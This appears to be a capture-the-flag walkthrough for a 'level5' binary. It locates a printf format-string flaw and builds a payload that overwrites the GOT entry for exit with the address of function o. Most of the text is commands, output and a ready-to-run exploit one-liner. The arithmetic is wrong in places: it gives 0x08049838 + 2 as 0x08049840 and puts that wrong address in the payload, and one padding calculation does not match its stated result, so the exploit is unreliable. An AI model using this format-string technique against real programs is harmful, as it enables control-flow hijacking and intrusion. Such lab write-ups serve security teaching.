In the code we can observe an unprotected call to `printf` that could enable us to replace the address of `exit` with the address of `o`.

## Investigation

1) We need to know at which argument our buffer is stored in `printf`.
     ```shell
     $ ./level5 < <(echo 'aaaa %x %x %x %x %x')
     aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520
     ```
     Our buffer is the 4th argument.

2) Then we will need to know the address of `exit`, where we will write the address of `o`.
    ```shell
    $ objdump -R ./level5 | grep exit
    08049838 R_386_JUMP_SLOT   exit
    ```
    The address of `exit` is `0x08049838`.

3) Finally, we will need the address of `o` to replace the address of `exit`.
    ```shell
    $ objdump -t ./level5 | grep o
    080484a4 g     F .text	0000001e              o
    ```
    The function `o` is located at `0x080484a4`

## Exploit

We will use the same method used in [level4](../level4/walkthrough.md).

We will first write `0x0804`, then `0x84a4`.
* For the upper value: `0x0804 = 0d2052 - 8 = 2044` that will be written at `0x08049838 + 2 = 0x08049840`.
* The lower value: `0x84a4 = 0d33956 - 2052 - 8 = 31904` that will be written at `0x08049838`.

The completed payload will be
```
\x40\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn
```

```shell
(cat <(python -c 'print "\x40\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"') -) | ./level5
```
